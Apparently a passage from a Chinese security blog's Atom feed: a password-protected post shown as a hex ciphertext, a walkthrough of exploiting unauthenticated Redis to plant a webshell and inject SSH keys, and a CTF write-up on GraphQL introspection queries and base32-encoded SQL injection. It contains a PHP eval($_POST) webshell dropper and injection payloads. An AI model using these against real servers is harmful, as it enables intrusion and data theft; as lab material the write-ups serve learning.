de67f0883c3978134a7d9312bb9e4768fea9920d436afbb5fec1d4ff623b97a95fd9c495be7de154399e93260e4a62fcd6260d5312e4ccc47898fde4b133800c77218808f23af2114846f7a1b0d3698ec55508245b043a6e351262f90754bc9321c454dec9851c8def5f55e28be39b57bed6ec4d5b4c3c7b8b5e2a152b943438fc073cc5f15a9728067b8cb1e8f860ff2623aaf18ea6bb2816b141f7e02afe8ecf5c411c54f55a8f6a8f6042bf93ac4be63a28c9c52787007aa90e2dd6e75e23f0dc0b5f0f427f56058ebeaba86bc3dc86cbc6aba848fb3c0d9adef2920fd333f45115491e2d144bd514a8a48fe80402c4c86182b7d26e443c7fde28d6136c6afc55a2f2590b809d5a5b8af813788bf4dcd6798400e3b71d3f4fe64d50455aa7327bb7c1bcc8f558def80463c7bb7f4d22a198b35dda9d554c29536571551949dfde0bb1a626ed10b34803a1506d44b0d3c2a7f8ca996f1b74b6ab23ab5e1c956fc05d0652abc647e2a7902081597726269ab4beeb9124c1e439a0eabadd4fe892730afbd92d23d7308133847d69ba9fe9d67123b3de4517399101bbd66510103644d938dfa0f10cdf40dfa239510cf5412326e465b753ed8732216802e6cdc07d3e5612d0514b71f86ddd5f10a3444d16ae6fcc4e3032dab5b2670b51f6020e5c44804e4f26bb9ff67729625582dd36b08fe06f9d6f7184394b8da6489aeee3e450ee1e3eefd16889ee27df54a7911ca151f5f3aab6274682b5d37c1dd9067154fb2df0403b03d39c19d687b42c754e77532f3bba9b4f54c06f5e7e9148e0b06f10abbce1c232a015a297a78937bea2b8464696dbd722f385871dc747902d22a939279a4585c26d31d766c89fb48790a82d63765ef9250a7e8ff22a52de827002c90b899adefa42bb0d81722226e1911671aebc7e257bc19bab2b23b086601fadcc6c6c5d748f69e0255e8e09b8220829805df5b910df7611d942aba54c7293e3e44d3f05c0a19cfc64f15963b3d2dd23194a26ed3dd6d4e76cd5b4dff56c724acbfb97422d94afaac0e745167708dd1c567f7fcb05c49dad0377c1b18954f17beeeb15286ca1fa56ff94117bbd1819e33f2e60d7583292736bfb2c3682b00fe2d5e6c524709ffc81ab00b405089927e239d524be779944cf4a46cd1b26de7a1246e616c6fbb759fd8e53e9b3c15be185474173095a51cd0820937afcf6b9af3f73c9e3dc2112f7665645c26c51fb23cdb6955a0d9b0fe0e93045b136150b652f230f2a38f5cacb3f5034bf594b7c93747c27ba472b3bdf84babf73665e72806dd1436f90a673836e9b2fad5598cbff2bcead9bb72a556ee8eb639f25a078bf1c047047f7a6011f6771e9db9f3f2be644ce74f51901373bf19edafac481c7034a4704aee961a072e485f9863cac11cfafeb5ef9b97c5f5a5887d338e324bfc97f258b53cd3305ceb69252a7e51da642ac617c601cb126e297bbe6fddec142fe8804d6ec226552ad66de67252c4b97260aa281477a6c6d7f35402c71a8ff724a6493b936a1fe5df1ac93444d2abf2329508a8270d26452c64ff4e84179f7da54282c3f8692b99485b75011697501d5b915ec631e58232f3a490add47f35227de9a874e6f56d6af15d4b819577cea14f24d9dee1570dbae8cffcc5c3702d3ed111f9457f3653b0aadc404af539a83548ab51f560e7b80c83a289048e60ed52513253beb41bed776484564e120a30488c65486bb7ebfad0257de8052be52256cb79639061ade2fb09c5fdc32438634a7d8e56a1780a6eb4d7701e39265ee56306d23b0f054bf5fc759d10e1ae3f6b02c22765ad4b1f4a6180a1c604b126dd4057ec72e45960f55336ed1b48c41cd420f988b60372ef0310ea8153ef8806778728d49f1ddf7f1dab2a37e448b35d108c4a1736bdb7a6868c9ce68aa4150e3b7ef9085ddfb46dae2156870db9ce26b97092ac001f06dc8c69db34c97393705420509dcac16e6ca68405b0c9282b423fbe53a08d1fd92d7794c5519970ca2eb7c6325f1aaf378039c78a7424a79342d47c99b8b305fefdad35f9bf9c5c57c69729c59c9fcd0214efca41c9b18343668901187d59500482075c1dac9da9bee99645e912b28040ee254a1af2d2ebb17c57edb838195040ca0a447b14107e6b131d5bed8e4b9e1852b6db25caecaf45dd79bc958555286486dae499113b0eb49d24a84c65d70757814df91ddb6d8264b4b37915b6562302617d93d1e48f03de50a27d6f0694ef652c8b883f5985b3aa36057017ab4434004096395ec005f97aaa61f4bef85482c6acead6eaedd57f695ed25fbadad4802e24d128dce07e1bc276aac942ffbe0a31d59a367af33cdce44c1e71977dc889017004c3818ce6a2ba5e800c4c88932e0e634e254a6971140e6787ba5b106844752f6e927ca7a73646a7783911fde4a9b5805ebfb598b85593f9cb20f5e23dda0ff0c042e14090c8c2b3e9f365d1862900c091f228b3149d15befb71b780d47711a2fb75ecc176b16692c1bee233c4e5c1d5fb50a8880078a4aa940fada42fa22ee121d1c0270acb69989aa9b4a82c893e79f9ad46a51ba68873971d269987707c869bc9a717b87e1233d2b0951f44be53599640811feead9037b7b812d44e0b4f60402e364a6f56e3f0a788c27da9366a0428404ff3822f64ad3ac9acb33ffe113eee047d9e822ef539a77abc186cbfb5a135e8f05c4889af1b0c202e118241564661ac58c272c7ac8261a4f56ab72eb4e79c52a65a0c43c5765899dcd78fe7fd4d04719e775d3e15df0215a54e53f6a4dcf875b976a28abf7a128494a27497b777b05ad2f8137941281fd04aec079c38b52c23ab04e62041cae2bb53ee82e9aede03e969db5c4fe19fba4d4b1c113736593d24a875468883f2d9cec553e8f5e8ceee0c2d0ac6ccf7ec0d96afc1d081b1f8c3f0dfa9c573ca53f8bbd94b13c0d960a261b2e8054e7733d98dbcd9d81ba47e8f893e68a474726fa0506537c7b6f9016deff9017e48fe5a990ac5724418807a64d2cae35cf1a6c88a27e2f20720404dff168276511e45bb2e54f37203e487702345f55b69f82e32f8a27cc20a83c6131c5d8e746b40185cfb8355423106dfcb780badd19a43f24b6b754e513729c9311ad7c58ab921f41fb7b5e60f738c3c182393d50991138d18750724cae979b2e56d1662c89afef60d53b51603ef427970a2e8c02b72f729bd39a476a606402a15b1975da17f494cfc0d1547a175fd84eabe3e4a41e804f9cc1ec7f92f7a277fdc56f9e5e0d6d08b1462f528d91d8db576bc5d5ed22e1feebb91e9b0439d75832324c94e7e5ec1e9b7610b0407cd271c6e6d54e65578dd6af9f9f16e1e7dbc292bb6bae9640383f1b23a24ce4d2443442a7bc491b2f9c7dd882e3c76538dd7d6594ec8024b4bdf5b84c25ccfb15d2b3b34cc315f0afb7bf8da6e024e8bdc2d6f9d685182896597778eb0c4b5d4419fa9118cbf6bab4fe750c00e259260a3779fff7a0e34b4ab97625ba79b87e6828e52273e157a188183c1de250d6cf797fc5345e83c58c183cc80af42f3667c70786c2fe2de9da70bf4b6776a3649a2d189fd4e33915a373c64a6ddf1dccd9a0587a7494bbba2b50157c478483401230e9998c6f893251a9a3da1cbf9207a478513a6cf6d32c1359ec16f1b457235a0d73db6f8636f56bf88ecac94af25889bd28b5e3577c4e737e0181b084082b6e511313d2d6c91d136eae2372b42a1394879d34bcd19b369a67c32371f7b8a22a0b3c51bbfa0f2e2b54c5ecb361682a00d9b39bb1e3ca9bc073a43b55035bd2b19a923984aa9c4111aaa4dd8df8035d2e47c1a25c1cc0ef86cac4a44b6b69f99437da9445b0052aff7d973eadcd54f2e72bb6e4a49d069335ea662cdf8f178b3026cb6b4038fd74494c76cecdbb7053a25ff39738aeb275bbf80206df6640693159a1f1459b8fc161dc730e05dc0ceaab082430fe759ced88c0baa909176dd1e966a8fa40eea3a5abd56f407fc1c3e5e2b789b8a9c42ef11328b6427e3444dac1ef26e8ab96f1248e1218145860419925c08d213b84bf25e8ff0e3a6c66c00f0462539ff04f13b4c60c2ec662693af3fc68386393027dfc4c8b17fa16bfe610389667c969bcd71332a61fd2dba571650769bb4cf493434acc436ff481ca9372ce6b0963ee4ef1e661f4e53263b70df717382432a908505886fa8a92d13343383d3d554367b620a07356c1b4de2da8488c4dd069cc75bd8fa826b49cc8d44a3000d52bdd0c4d449c0196551e99867a7b28ff676a32a342fa3227536f28109c93c803f45b6d3705a6e09b6c374d83c0ee3c7a702297633951e75721bbeadd3168a2481c7970be81bb24ca207918bcdbf07b7f8e3b23304f455a618e3289844167d6776b21a140c0d31ad4d6aae7ba38ea483a815ad550e3119795c5ae8cabbc12025ea5bcc96d3689d4f34f794cdcf69abcacb190c00f590d4c441c332fcd08c90d1ce46aa973b8036314e94c6ce22189371bbbbff70cdc802d54f348a1a8ad7c86c654885a553df2724cd597199946b1593deb19cabccb0b0d6ce48f46b3d711c7402c9450746464c30b99bb57c47184547eee69525a3e39f1a56aeb620eb5262392fa580e7a1fbf51572d909dbce65d6f864ed591a65679e6063990f98690a08d87676002d269c959f83bbb2eb1dee19aca36eb94d8f32fc4873df34192d0f96e8a1b046d99f202d604892c2e87800c60a681f7675a485c51c63fe3abdc1464d5e75b042987d38d0e67bb455e7f82f85f84d348819e5974274cf2efc53b1a835dd333065f8d43890b1971a1b7e774f209663db8f7563ae34e038fa660f9a6cad1b9b3b86bcdab9db3230001fcbbb15f05f6b2e993cae5e159e1fa3b4b683d46cf95a7bb818271312ddd68fa2b887a4f8a8e1c3f6c7ba7bd958ce63df6c0ba4f307b92e54d485d71f131a9acbc8e1ff9155b63c73c8ce61da9e0b8eb1b1ab337d5da2b3c4bc9fd1f4f539b2e5ab36b36e0dc469cff3d7b08842f8a621cb154bf928f0ce8ff877ccc659b31ca40aa563ec47ddc5313423e9d8f2136a8fa906a71c9433c391a8f7dac4758ffd08277c9ae775a36d75aa8a2a51a19cf2a00c2b70ff9322ceabce48438d5bb2bf30b552e854a2d65c091a4a348f54d2d791823d8e6164ca7fcc1f6c4a545a73bea07709454ab66a225fc84178aebd4023a85d983a62fe70e81d730f9e64e5ba72a201c181f32b207f93ea75962371c13856a78c66908f72d5a1b0300b9b0702e0c6f9ab6a1d1729b152eb89cf3603c18f82847188cf1bdfcc11a221828b03908dc8efc519016858cfef58ac2ba90ec08e714262e62e13568762ecb4adf7d6bbb5bf3d725de5e50009c15a63cb9121d8e12e0080a187a81c61c165212e42cc7218ceaa1359e0be67dd96ada8dcbc43282044c96d552dfceacdfbbd24429ebf8e1c7ea99940a29f4cd4032f668f3965f4c8d1127f44a925cf3dbc4540e7ed90f35f576ebc87ce045afa8b668ecbabdbfc22fc24277dee14a6fea6a578e06e4b388910be3daa4a2f215740f7f4f4126e5a64f8949bdf780ca94692af0fd6c2deed3160b0dfe4fa1963c0e38ea0394c32072e86c260a52da7f3f287f25da040b76e84455057000e2d0f62a354cad346253bc5ec53b6ab9e87dd52028f28a57987f89e8c8b053bb7aa05ccf7006a1ae1240acf87d1ff0a297569ad88c02df4b956eba4fdf6785dd4c840d1520689f1be1b2ea1fdb7a92c8ef8d3a5ba9104ac120d78c3329ca794d15a9b07faa66fb2aa9a016d468ffc3092df0edaa7326c927a4c04bbe210de2039fc8e44e0b23e5618881964fa7dc2afef3d1a90950cace4f441225ae5e705d8c75f82f5972f43211777b4db1333cd2978af7bb1a2fe51c3b5aad6d63836b6d39f0f4750067cd7af9f6546144ff1860777a8f28a5766091b253833d5a599dd192c763b6c9e365d3c33e3757e1d18cceed45932f90facb92d828917b24badaa9f7e2f211c11aa06f0a6d104db560a4e963c9ff7db1dd33286269e4bf5e1d77b7da12ab8674c3a4e8b8e26236a8a317302aab08dac08d536a560271eb4806cc33356fb710634d03aa7d0715ef91b5cf2a782606603053f1eaee01fad7768fc584603a4279dd44269b8390df2cfe40fa93c9de679e1cf4c7f83d938049b9e045f09e4e3b7f904053be302b34fce9c41e2f59cbb2f4b358bc03f5c061e50ececf23794bd27c7eb5cb07aa8e3b0d36aa625297ee1ded6802c1bc267da03e3b422f05f08f9742160d9a4048a1751b150ce5f7b4019cf1236b1a39085d840f7bfe19a3104c2a1e307f14c55c935feeeb09721f479e2c3e461fc4b440691f26eaa52b1205dd8983e2efb7edc60a773c9e477a44ee618ea6fd1cfa6fe43990f2b8fad6a15d529cb6cef2cb26a27643acc933058cf89179090aa7f8673e54da5e1fa393e99af1eccd8ff1dfabc6b9a05f939ec1cb4e38f67aa3b3f4da135ea29e7144f414f5cca89841bbe92a88f14a80cf1608dd9b99410ae2fc049e71dbcea08bdcc2e109a7f7465f99b0bac080d1868e9da2678f666d22cff3a1c46cecb5646d09a88cc3439e6e12d12fad4c60e2e29a0c7e284eaab66ccca2dcc7de16c65206cfbe30e0c344ab5eb458326fe09f512209fadb536a4dd5f4712b50c7c110fde62b504ae9219ddbdb7f49c8e7228b08a0fb7ab9226254eab29cf0cd05e2a1d152195f30ef2747badfcf03090c32ce8facbb3579a464327f8179422b5d0de412a41e29475da1590deb2fa47bb541e8ad67537037b30656e9be43691ec6c56340053ca0f1220280d95d5ba3c0143d54c802b80996dd88bf7b2ca6a24862827a0f5b05b1ef236c5a9895c95e81df3500a834d49abf91a5edb3d733c75b886df904feb01bc05777fac5a26ffbfb3d3f02054ab9e910ab67a79eef401ef654007f80367e96c593a698a3bca5db7d86b3b4814b283aba5257f5ef19b4624fcef5abbc6658fd8a59a6a5f98344e28620e9d1ff1fd26b8ea8926f4cee1181eec0bd25f7eda64f44</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Redis未授权访问漏洞复现与利用</title>
    <link href="http://yoursite.com/2020/04/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2020/04/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/</id>
    <published>2020-04-18T03:50:17.000Z</published>
    <updated>2020-04-18T04:07:25.034Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-漏洞简介以及危害"><a href="#0x-01-漏洞简介以及危害" class="headerlink" title="0x 01 漏洞简介以及危害"></a>0x 01 漏洞简介以及危害</h3><ul><li>漏洞简介</li></ul><p>​        Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis  服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取  Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p><p>简单说，漏洞的产生条件有以下两点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；</span><br><span class="line">（2）没有设置密码认证（一般为空），可以免密码远程登录redis服务。</span><br></pre></td></tr></table></figure><ul><li>漏洞危害</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；</span><br><span class="line">（2）攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件；</span><br><span class="line">（3）最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器</span><br></pre></td></tr></table></figure><h3 id="0x-02-漏洞复现"><a href="#0x-02-漏洞复现" class="headerlink" title="0x 02 漏洞复现"></a>0x 02 漏洞复现</h3><p>参考这篇文章搭建复现环境：<a href="https://www.cnblogs.com/bmjoker/p/9548962.html" target="_blank" rel="noopener">10.Redis未授权访问漏洞复现与利用</a></p><p>攻击机ip地址：192.168.194.132（本机虚拟机）</p><p>靶机IP地址：47.96.150.181（公网服务器）</p><h3 id="0x-03-未授权访问漏洞测试"><a href="#0x-03-未授权访问漏洞测试" class="headerlink" title="0x 03 未授权访问漏洞测试"></a>0x 03 未授权访问漏洞测试</h3><ul><li>验证漏洞存在</li></ul><p><img src="/2020/04/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/image-20200418115921434.png" alt></p><h4 id="3-1-利用redis写webshell"><a href="#3-1-利用redis写webshell" class="headerlink" title="3.1 利用redis写webshell"></a>3.1 利用redis写webshell</h4><p>利用前提：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证</span><br><span class="line">2.开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限（我们可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则我们就可以写入一个路径为a&#x2F;b的任意文件。）</span><br></pre></td></tr></table></figure><p>我们尝试把shell写入/var/www/html目录下：</p><p><img src="/2020/04/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/image-20200418120207512.png" alt></p><p>靶机查看是否写入成功</p><p><img src="/2020/04/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/image-20200418120256926.png" alt></p><p>成功写入shell。</p><p>当数据库过大时，redis写shell的小技巧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">set_time_limit(0);</span><br><span class="line">$fp&#x3D;fopen(&#39;bmjoker.php&#39;,&#39;w&#39;);</span><br><span class="line">fwrite($fp,&#39;&lt;?php @eval($_POST[\&quot;bmjoker\&quot;]);?&gt;&#39;);</span><br><span class="line">exit();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="3-2-利用”公私钥”认证获取root权限"><a href="#3-2-利用”公私钥”认证获取root权限" class="headerlink" title="3.2 利用”公私钥”认证获取root权限"></a>3.2 利用”公私钥”认证获取root权限</h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-漏洞简介以及危害&quot;&gt;&lt;a href=&quot;#0x-01-漏洞简介以及危害&quot; class=&quot;headerlink&quot; title=&quot;0x 01 漏洞简介以及危害&quot;&gt;&lt;/a&gt;0x 01 漏洞简介以及危害&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;漏洞简介&lt;/li&gt;
&lt;/ul&gt;

      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>当CTF遇上GraphQL的那些事</title>
    <link href="http://yoursite.com/2020/04/14/%E5%BD%93CTF%E9%81%87%E4%B8%8AGraphQL%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    <id>http://yoursite.com/2020/04/14/%E5%BD%93CTF%E9%81%87%E4%B8%8AGraphQL%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</id>
    <published>2020-04-14T06:17:45.000Z</published>
    <updated>2020-04-15T17:03:16.694Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-前言"><a href="#0x-01-前言" class="headerlink" title="0x 01 前言"></a>0x 01 前言</h3><p>​    在之前的VolgaCTF 2020考到了GraphQL知识点，GraphQL在CTF比赛中虽然遇到的不多，但偶尔也会碰到，在碰到GraphQL的题目时候该如何解决呢？于是就有了这一篇文章。</p><h3 id="0x-02-认识GraphQL"><a href="#0x-02-认识GraphQL" class="headerlink" title="0x 02 认识GraphQL"></a>0x 02 认识GraphQL</h3><p>​        那么什么是GraphQL呢？GraphQL是由Facebook创造并开源的一种用于API的查询语言。看到QL这样的字眼，很容易产生误解，以为是新的数据库查询语言，但其实GraphQL和数据库没有什么太大关系，GraphQL并不直接操作查询数据库，可以理解为传统的后端代码与数据库之间又多加了一层，这一层就是GraphQL。</p><p>想快速入门GraphQL的相关用法可以参考这一篇文章<a href="https://segmentfault.com/a/1190000014131950" target="_blank" rel="noopener">30分钟理解GraphQL核心概念</a></p><p>我们这里重点关注一下Resolver（解析函数）的工作流程，假设我们定义了以下的查询语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Query &#123;</span><br><span class="line">  articles &#123;</span><br><span class="line">       id</span><br><span class="line">       author &#123;</span><br><span class="line">           name</span><br><span class="line">       &#125;</span><br><span class="line">       comments &#123;</span><br><span class="line">      id</span><br><span class="line">      desc</span><br><span class="line">      author</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GraphQL在解析这段查询语句时会按如下步骤进行解析：</p><ul><li>首先进行第一层解析，当前<code>Query</code>的<code>Root Query</code>类型是<code>query</code>，同时需要它的名字是<code>articles</code></li><li>之后会尝试使用<code>articles</code>的<code>Resolver</code>获取解析数据，第一层解析完毕</li><li>之后对第一层解析的返回值，进行第二层解析，当前<code>articles</code>还包含三个子<code>Query</code>，分别是<code>id</code>、<code>author</code>和<code>comments</code><ul><li>id在Author类型中为标量类型，解析结束</li><li>author在Author类型中为对象类型User，尝试使用<code>User</code>的<code>Resolver</code>获取数据，当前field解析完毕</li><li>之后对第二层解析的返回值，进行第三层解析，当前<code>author</code>还包含一个<code>Query</code>, <code>name</code>，由于它是标量类型，解析结束</li><li>comments同上…</li></ul></li></ul><p>​        总结来说，GraphQL大体的解析流程就是遇到一个Query之后，尝试使用它的Resolver取值，之后再对返回值进行解析，这个过程是递归的，直到所解析Field的类型是<code>Scalar Type（标量类型）</code>为止。解析的整个过程我们可以把它想象成一个很长的Resolver Chain（解析链）。GraphQL大体的解析流程很像是遍历树结构，那么他的返回值也是类<em>树</em>结构展示的。</p><p>​        对于发送数据我们可以使用postman或者GraphiQL，相对于burp suit，数据结构会更加直观一些。</p><h3 id="0x-03-常用payload"><a href="#0x-03-常用payload" class="headerlink" title="0x 03 常用payload"></a>0x 03 常用payload</h3><p>​    在对GraphQL测试之前我们要知道只有代码里写了接口，定义了相应的schema，才能通过GraphQL查询出对应结果，所以并不是通过GraphQL就能查询获取数据库中的所有数据。</p><p>​    由于GraphQL自带强大的内省自检机制，可以直接获取后端定义的所有接口信息，常常存在信息泄露问题。那么我们可以通过<code>__schema</code>查询所有可用对象。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    __schema &#123;</span><br><span class="line">        types &#123;</span><br><span class="line">            name</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>__type</code>查询指定对象的所有字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    __type(name: &quot;User&quot;) &#123;</span><br><span class="line">        name</span><br><span class="line">        fields &#123;</span><br><span class="line">            name</span><br><span class="line">            type &#123;</span><br><span class="line">                name</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是有时目标网站可能存在几十个对象，一个一个查找出具体的字段显示是太麻烦了，那么通过这两个payload可以获取所有对象和字段</p><p>payload1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query IntrospectionQuery&#123;__schema&#123;queryType&#123;name&#125;mutationType&#123;name&#125;subscriptionType&#123;name&#125;types&#123;...FullType&#125;directives&#123;name description locations args&#123;...InputValue&#125;&#125;&#125;&#125;fragment FullType on __Type&#123;kind name description fields(includeDeprecated:true)&#123;name description args&#123;...InputValue&#125;type&#123;...TypeRef&#125;isDeprecated deprecationReason&#125;inputFields&#123;...InputValue&#125;interfaces&#123;...TypeRef&#125;enumValues(includeDeprecated:true)&#123;name description isDeprecated deprecationReason&#125;possibleTypes&#123;...TypeRef&#125;&#125;fragment InputValue on __InputValue&#123;name description type&#123;...TypeRef&#125;defaultValue&#125;fragment TypeRef on __Type&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>payload2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query IntrospectionQuery&#123;__schema&#123;queryType&#123;name&#125;mutationType&#123;name&#125;subscriptionType&#123;name&#125;types&#123;...FullType&#125;directives&#123;name description args&#123;...InputValue&#125;onOperation onFragment onField&#125;&#125;&#125;fragment FullType on __Type&#123;kind name description fields(includeDeprecated:true)&#123;name description args&#123;...InputValue&#125;type&#123;...TypeRef&#125;isDeprecated deprecationReason&#125;inputFields&#123;...InputValue&#125;interfaces&#123;...TypeRef&#125;enumValues(includeDeprecated:true)&#123;name description isDeprecated deprecationReason&#125;possibleTypes&#123;...TypeRef&#125;&#125;fragment InputValue on __InputValue&#123;name description type&#123;...TypeRef&#125;defaultValue&#125;fragment TypeRef on __Type&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>具体原理是通过<strong>IntrospectionQuery</strong>，返回包含足够多的信息的结果。</p><p>另外这篇文章里面*[GraphQL injection](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL</a> Injection)*也提供了一些payload可供使用</p><ul><li>常用工具：</li></ul><p><a href="https://github.com/swisskyrepo/GraphQLmap" target="_blank" rel="noopener">https://github.com/swisskyrepo/GraphQLmap</a></p><h3 id="0x-04-例题分析："><a href="#0x-04-例题分析：" class="headerlink" title="0x 04 例题分析："></a>0x 04 例题分析：</h3><p>这里以HITCTF2018 BabyQuery为例，题目的复现环境可以在github上找到：<a href="https://github.com/JohnHubcr/HITCTF2018/tree/master/web/BabyQuery" target="_blank" rel="noopener">HITCTF2018 BabyQuery</a></p><p>题目打开有一个点击查询成绩的按钮，点击会弹窗显示成绩，右键源代码可以发现一段js</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$(document).ready(function()&#123;</span><br><span class="line">            var query_data &#x3D; &#123;&#39;query&#39;: &#39;&#123; getscorebyid(id: &quot;GE&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;)&#123; id name score &#125; &#125;&#39;&#125;</span><br><span class="line">            var btn &#x3D; $(&#39;#query&#39;);</span><br><span class="line">            btn.click(function()&#123;</span><br><span class="line">                $.post(&#39;&#x2F;graphql&#39;, query_data, function(result)&#123;</span><br><span class="line">                    alert(result);</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure><p>根据graphql可知后端使用了graphql查询api，我们使用上文中的payload，查看schema发现Query 操作有两个field: getscorebyyourname和getscorebyid 参数分别是name和id, 通过手工测试发现id参数经过base32编码且仅能是1位数, 而name参数存在SQL注入，那么可以构造payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">query&#x3D;</span><br><span class="line">&#123;  getscorebyyourname(name:&quot;xxxx&quot;)</span><br><span class="line">&#123;</span><br><span class="line">score</span><br><span class="line">name</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>name参数的值用我们构造SQL注入语句的经过base32编码后的结果替换。</p><p>首先是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select sqlite_version()-- </span><br><span class="line">&#x2F;&#x2F;查询出版本号:3.11.0,那么可以判断数据库为sqlite3</span><br><span class="line">1&#39; union select (select group_concat(name,0x3a) from 